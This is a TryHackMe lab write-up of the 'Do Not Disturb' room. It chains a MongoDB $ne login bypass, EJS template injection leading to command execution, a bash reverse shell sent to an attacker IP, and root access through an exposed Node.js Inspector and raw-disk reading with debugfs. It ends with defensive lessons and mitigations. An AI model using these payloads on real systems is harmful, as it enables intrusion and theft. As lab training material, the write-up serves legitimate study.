# Do Not Disturb | TryHackMe Write-Up

> **Room:** Do Not Disturb
> **Category:** Boot2Root
> **Platform:** TryHackMe
> **Challenge:** Hacker Holidays 2026 – Day 7
> **Target:** `10.66.147.56`

## Room Overview

The Byte Lotus poolside platform tracks cabanas, sunbeds, and active guest sessions. The room briefing suggests that someone has gained unauthorized access and has been moving through the system for some time.

The objective was to investigate the exposed poolside platform, obtain an initial foothold, and recover the user flag.

The attack path to the first flag was:

```text
Nmap Reconnaissance
        ↓
NoSQL Authentication Bypass
        ↓
Staff Access as attendant
        ↓
EJS Server-Side Template Injection
        ↓
Remote Code Execution
        ↓
Reverse Shell as poolside
        ↓
User Flag
```

---

# 1. Reconnaissance

I began by setting the target IP as an environment variable:

```bash
export IP=10.66.147.56
```

I then performed an Nmap scan using default scripts, service detection, and OS detection:

```bash
nmap -sV -sC -A $IP
```

## Nmap Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Node.js (Express middleware)
```

The scan revealed two open ports:

| Port | Service | Details                     |
| ---- | ------- | --------------------------- |
| `22` | SSH     | OpenSSH 9.6p1               |
| `80` | HTTP    | Node.js Express application |

The web application running on port `80` was the primary attack surface.

I opened the application in the browser:

```text
http://10.66.147.56
```

The application provided a login page.

---

# 2. Testing the Login Functionality

I attempted to log in using the username:

```text
attendant
```

and a test password:

```text
test
```

The login attempt returned:

```text
HTTP/1.1 401 Unauthorized
```

Using Firefox Developer Tools, I inspected the login request and identified the following details:

```text
Method: POST
Endpoint: /login
Content-Type: application/x-www-form-urlencoded
```

The room's intended attack path involved a MongoDB-style NoSQL injection. Since the application accepted URL-encoded form data, I tested whether the password field could be converted into a MongoDB query operator.

---

# 3. NoSQL Authentication Bypass

MongoDB supports operators such as:

```text
$ne
```

The `$ne` operator means **not equal**.

If an application directly passes user-controlled input into a MongoDB query, an attacker may be able to replace a normal password value with an operator.

I sent the following request using `curl`:

```bash
curl -i -s -X POST "http://$IP/login" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "username=attendant" \
--data-urlencode 'password[$ne]='
```

The server responded with:

```text
HTTP/1.1 302 Found
Location: /staff
Set-Cookie: connect.sid=...
```

The redirect to `/staff` confirmed that authentication had been bypassed successfully.

The vulnerable payload was:

```text
username=attendant&password[$ne]=
```

Instead of comparing the supplied password to the stored password normally, the application interpreted the input as a MongoDB operator.

The authentication bypass provided access to the staff area as the `attendant` user.

---

# 4. Accessing the Staff Portal

I saved the authenticated session cookie:

```bash
curl -i -s -c cookies.txt -X POST "http://$IP/login" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "username=attendant" \
--data-urlencode 'password[$ne]='
```

The cookie was stored in:

```text
cookies.txt
```

I then used the saved session to access the staff portal:

```bash
curl -s -b cookies.txt "http://$IP/staff" | tee staff.html
```

To identify interesting functionality, I searched the page source:

```bash
grep -Ein "form|action=|input|textarea|template|render|preview|ejs|script|href=" staff.html
```

The output revealed a template preview feature:

```html
<form method="post" action="/staff/preview">
  <label>
    Confirmation template
    <span class="muted">
      (EJS — use <code>&lt;%= guest %&gt;</code> to personalise)
    </span>
  </label>

  <textarea name="template">
Dear <%= guest %>, your Byte Lotus cabana is confirmed.
  </textarea>

  <button type="submit">Preview</button>
</form>
```

The application accepted a user-controlled EJS template and submitted it to:

```text
POST /staff/preview
```

This was a strong indication of a potential **EJS Server-Side Template Injection (SSTI)** vulnerability.

---

# 5. Confirming EJS Template Injection

EJS allows JavaScript expressions to be evaluated using syntax such as:

```ejs
<%= expression %>
```

I tested whether the application evaluated expressions by submitting:

```ejs
<%= 7 * 7 %>
```

The request was sent using:

```bash
curl -s -b cookies.txt \
-X POST "http://$IP/staff/preview" \
--data-urlencode 'template=<%= 7 * 7 %>'
```

The application evaluated the expression and returned:

```text
49
```

This confirmed that attacker-controlled EJS expressions were being executed on the server.

---

# 6. Remote Code Execution

Since EJS expressions were evaluated by the Node.js application, I used Node.js's `child_process` module to execute the `id` command.

The following payload was submitted:

```ejs
<%= global.process.mainModule.require("child_process").execSync("id").toString() %>
```

The request was:

```bash
curl -s -b cookies.txt \
-X POST "http://$IP/staff/preview" \
--data-urlencode 'template=<%= global.process.mainModule.require("child_process").execSync("id").toString() %>'
```

The command executed successfully, confirming remote code execution through the EJS template.

The vulnerability chain was now:

```text
User-Controlled EJS Template
        ↓
Server-Side Template Evaluation
        ↓
Node.js child_process Access
        ↓
Operating System Command Execution
```

---

# 7. Obtaining a Reverse Shell

I started a Netcat listener on the AttackBox:

```bash
rlwrap nc -lvnp 4444
```

The AttackBox IP was:

```text
10.66.138.36
```

I then submitted an EJS payload that executed a Bash reverse shell:

```bash
curl -s -b cookies.txt \
-X POST "http://$IP/staff/preview" \
--data-urlencode 'template=<%= global.process.mainModule.require("child_process").execSync("bash -c '\''bash -i >& /dev/tcp/10.66.138.36/4444 0>&1'\''").toString() %>'
```

The listener received a connection:

```text
Listening on 0.0.0.0 4444
Connection received on 10.66.147.56
```

The shell initially displayed:

```text
bash: cannot set terminal process group
bash: no job control in this shell
```

This is expected when receiving a basic reverse shell.

I verified the current user:

```bash
whoami
```

Output:

```text
poolside
```

I checked the user ID:

```bash
id
```

Output:

```text
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

I also checked the hostname:

```bash
hostname
```

Output:

```text
tryhackme-2404
```

The current working directory was:

```bash
pwd
```

Output:

```text
/opt/poolside
```

The initial foothold had been obtained as the `poolside` user.

---

# 8. Upgrading the Shell

I upgraded the shell using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This provided a more interactive terminal.

---

# 9. Finding the User Flag

I searched the filesystem for `user.txt`:

```bash
find / -name user.txt -type f 2>/dev/null
```

The command returned:

```text
/home/poolside/user.txt
```

I read the file:

```bash
cat /home/poolside/user.txt
```

## User Flag

```text
THM{w4rm_s3ss10n_h1j4ck3d}
```

---

# Attack Chain Summary

```text
Port 80
   ↓
Node.js Express Application
   ↓
NoSQL Injection Using $ne
   ↓
Authentication Bypass as attendant
   ↓
Access to /staff
   ↓
User-Controlled EJS Template
   ↓
EJS Server-Side Template Injection
   ↓
Node.js Command Execution
   ↓
Bash Reverse Shell
   ↓
poolside User
   ↓
User Flag
```

---

# Key Lessons

## 1. Validate Input Types

The application accepted an object-like value for the password field:

```text
password[$ne]=
```

Authentication fields should be validated as strings before being used in database queries.

## 2. Avoid Passing User Input Directly to Database Queries

User input should never be inserted directly into MongoDB queries without validation and sanitization.

## 3. Do Not Render Untrusted EJS Templates

EJS templates can execute JavaScript. Allowing users to provide template source can result in server-side code execution.

## 4. Apply the Principle of Least Privilege

The Node.js application ran as the `poolside` user. Service accounts should have only the permissions required for their intended functionality.

## 5. Restrict Template Functionality

If users need customizable messages, use safe placeholders rather than allowing arbitrary EJS syntax.

For example:

```text
Dear {{guest}}, your Byte Lotus cabana is confirmed.
```

A safe placeholder replacement system is preferable to evaluating user-controlled template code.

---

# Mitigation Recommendations

* Validate usernames and passwords as strings.
* Reject MongoDB operators in authentication input.
* Use strict schema validation.
* Avoid directly passing request data into MongoDB queries.
* Never compile or render untrusted EJS templates.
* Use a safe templating or placeholder system for user-generated content.
* Run application services with minimal privileges.
* Monitor authentication anomalies and unexpected template execution.

---

# Conclusion

The first stage of **Do Not Disturb** demonstrated how multiple web application weaknesses can be chained into a complete initial compromise.

A MongoDB NoSQL injection bypassed authentication and granted access to the staff portal. The staff portal exposed a user-controlled EJS template preview feature, which allowed server-side JavaScript execution. This was escalated into operating system command execution and a reverse shell as the `poolside` user.

The user flag was recovered from:

```text
/home/poolside/user.txt
```

```text
THM{w4rm_s3ss10n_h1j4ck3d}
```
<img width="975" height="417" alt="image" src="https://github.com/user-attachments/assets/45fd5d4a-219f-44de-bfd4-78f7ad0e705c" />


The next stage is to investigate the exposed Node.js Inspector service and continue toward the root flag.


# Privilege Escalation and Root Flag

After obtaining a reverse shell as the `poolside` user and recovering the user flag, the next objective was to escalate privileges and retrieve the root flag.

The privilege-escalation path was:

```text
poolside
   ↓
Exposed Node.js Inspector
   ↓
Chrome DevTools Protocol
   ↓
Runtime.evaluate
   ↓
Command Execution as pipelinesvc
   ↓
disk Group Membership
   ↓
Raw Block Device Access
   ↓
debugfs
   ↓
/root/root.txt
```

---

## 10. Enumerating Local Services

After gaining access as `poolside`, I checked for locally listening services:

```bash
ss -lntp
```

The output revealed a service listening only on localhost:

```text
LISTEN 0 511 127.0.0.1:9229 0.0.0.0:*
```

Port `9229` is commonly associated with the **Node.js Inspector**.

Because the service was bound to `127.0.0.1`, it was not directly accessible from outside the target. However, the existing `poolside` shell allowed local interaction with it.

I then inspected the running Node.js processes:

```bash
ps auxww | grep -i '[n]ode'
```

Output:

```text
pipelin+  599  0.0  2.2 856472 45016 ?  Ssl  19:20  0:00 /usr/bin/node --inspect=127.0.0.1:9229 processor.js

poolside  601  0.1  3.1 1018560 61780 ?  Ssl  19:20  0:00 /usr/bin/node app.js
```

The output showed that:

* The main web application, `app.js`, ran as `poolside`.
* The `processor.js` application ran as the `pipelinesvc` user.
* The `processor.js` process exposed the Node.js Inspector on `127.0.0.1:9229`.

This presented an opportunity to execute JavaScript within the context of the more privileged `pipelinesvc` process.

---

## 11. Enumerating the Node.js Inspector

The Node.js Inspector provides an HTTP endpoint that exposes information about active debugging targets.

I queried the endpoint:

```bash
curl -s http://127.0.0.1:9229/json
```

The response included:

```json
[
  {
    "description": "node.js instance",
    "title": "processor.js",
    "type": "node",
    "url": "file:///opt/pipelinesvc/telemetry/processor.js",
    "webSocketDebuggerUrl": "ws://127.0.0.1:9229/18caf137-9714-457f-a5fe-bcb0b93314af"
  }
]
```

The important value was:

```text
ws://127.0.0.1:9229/18caf137-9714-457f-a5fe-bcb0b93314af
```

The UUID is generated dynamically and may change whenever the target machine is restarted.

The Inspector uses the **Chrome DevTools Protocol (CDP)** over WebSocket connections. This protocol supports the `Runtime.evaluate` method, which can evaluate JavaScript inside the inspected Node.js process.

---

## 12. Creating a Lightweight WebSocket Client

The target did not contain common WebSocket tools such as:

```text
wscat
websocat
```

The Python `websocket` module was also unavailable.

To communicate with the Inspector without installing additional packages, I created a lightweight Python client using built-in modules.

The script:

* Opened a TCP connection to `127.0.0.1:9229`
* Performed a WebSocket upgrade
* Created a masked WebSocket frame
* Sent a Chrome DevTools Protocol request
* Read and displayed the response

The connection was successful:

```text
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
```

The `101 Switching Protocols` response confirmed that the WebSocket connection to the Node.js Inspector had been established.

---

## 13. Executing Commands as `pipelinesvc`

The first attempt used:

```javascript
require('child_process').execSync('id').toString()
```

However, the Inspector returned:

```text
ReferenceError: require is not defined
```

The Inspector evaluation context did not expose `require` as a global function.

I then accessed the module loader through the Node.js process object:

```javascript
process.mainModule.require('child_process').execSync('id').toString()
```

The Inspector returned:

```text
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

This confirmed successful command execution as:

```text
pipelinesvc
```

The most important discovery was:

```text
groups=995(pipelinesvc),6(disk)
```

The `pipelinesvc` account belonged to the Linux `disk` group.

Membership in the `disk` group can provide access to raw storage devices. This is highly privileged because raw disk access can bypass normal filesystem permission checks.

---

## 14. Identifying the Root Filesystem

Using the Node.js Inspector command-execution capability, I executed:

```bash
lsblk
```

The output showed:

```text
NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS

nvme0n1     259:0    0    20G  0 disk
└─nvme0n1p1 259:1    0    20G  0 part /
```

The root filesystem was mounted on:

```text
/dev/nvme0n1p1
```

The `pipelinesvc` account could access the underlying block device because it belonged to the `disk` group.

---

## 15. Checking for `debugfs`

I checked whether `debugfs` was installed:

```bash
which debugfs
```

Output:

```text
/usr/sbin/debugfs
```

`debugfs` is a filesystem debugging utility that can inspect ext-family filesystems directly.

When used against a raw filesystem partition, `debugfs` can read files without relying on the normal Linux permission checks enforced during standard filesystem access.

---

## 16. Reading the Root Flag from the Raw Partition

The root flag was stored at:

```text
/root/root.txt
```

The `pipelinesvc` account could not normally read this file through the mounted filesystem. However, access to the raw root partition allowed the file to be retrieved directly.

I executed:

```bash
debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1
```

The command was executed through the Node.js Inspector context as `pipelinesvc`.

The response returned:

```text
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

---

# Root Flag

```text
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

---

# Privilege Escalation Summary

```text
poolside Shell
      ↓
Local Node.js Inspector on 127.0.0.1:9229
      ↓
Inspector WebSocket Endpoint
      ↓
Chrome DevTools Protocol
      ↓
Runtime.evaluate
      ↓
JavaScript Execution in processor.js
      ↓
Command Execution as pipelinesvc
      ↓
pipelinesvc Belongs to the disk Group
      ↓
Raw Access to /dev/nvme0n1p1
      ↓
debugfs Reads /root/root.txt
      ↓
Root Flag
```

---

# Key Security Lessons

## 1. Do Not Expose the Node.js Inspector in Production

The Node.js Inspector provides powerful debugging capabilities. If an attacker can access the Inspector, they may be able to evaluate arbitrary JavaScript inside the target process.

The Inspector should not be enabled in production environments unless it is strictly required.

---

## 2. Restrict Debugging Services

The Inspector was bound to:

```text
127.0.0.1:9229
```

Binding the service to localhost prevented direct remote access. However, once an attacker gained a local shell, the service became accessible.

Local-only services should still be treated as sensitive and protected accordingly.

---

## 3. Avoid Granting Service Accounts Membership in the `disk` Group

The `disk` group can provide direct access to storage devices.

Raw disk access may allow an attacker to:

* Read protected files
* Bypass normal filesystem permissions
* Access sensitive data
* Modify filesystem contents
* Recover deleted information

Service accounts should follow the principle of least privilege and should not belong to privileged groups unless absolutely necessary.

---

## 4. Raw Disk Access Can Bypass File Permissions

Linux file permissions are enforced when files are accessed through the mounted filesystem.

By reading the underlying filesystem directly through a block device, tools such as `debugfs` can access filesystem data without using the normal file-permission path.

In this challenge, the `disk` group provided a path around the permissions protecting:

```text
/root/root.txt
```

---

# Conclusion

The privilege escalation began with an exposed Node.js Inspector service running inside the `pipelinesvc` process.

By communicating with the Inspector through the Chrome DevTools Protocol and using `Runtime.evaluate`, it was possible to execute operating-system commands as `pipelinesvc`.

The `pipelinesvc` account belonged to the privileged `disk` group and could access the raw root filesystem partition:

```text
/dev/nvme0n1p1
```

Using `debugfs`, the root flag was recovered directly from the underlying filesystem:

```text
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```
<img width="959" height="429" alt="image" src="https://github.com/user-attachments/assets/05663387-3883-4bfb-ada1-51bbb79a0f57" />

